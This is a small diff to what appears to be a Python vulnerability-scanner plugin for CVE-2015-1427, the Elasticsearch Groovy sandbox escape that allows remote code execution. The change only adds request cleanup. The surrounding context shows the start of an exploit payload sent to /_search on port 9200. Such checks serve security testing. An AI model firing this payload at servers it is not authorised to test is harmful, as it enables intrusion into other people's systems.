@@ -23,6 +23,7 @@ class P(T):
            加入了沙盒进行控制，由于沙盒限制的不严格，导致远程代码执行
     '''
     def CVE20151427(self,url):
+        req=None
         try:
             target_url = "http://"+url+":9200/_search"
             payload = '{"size": 1,"script_fields": {"secpulse": {"script":'   \
@@ -32,6 +33,9 @@ class P(T):
         except Exception,e:
             content = e
         finally:
+
+            if req:
+                req.close()
             return content
     
     def verify(self,head='',context='',ip='',port='',productname='',keywords='',hackinfo=''):
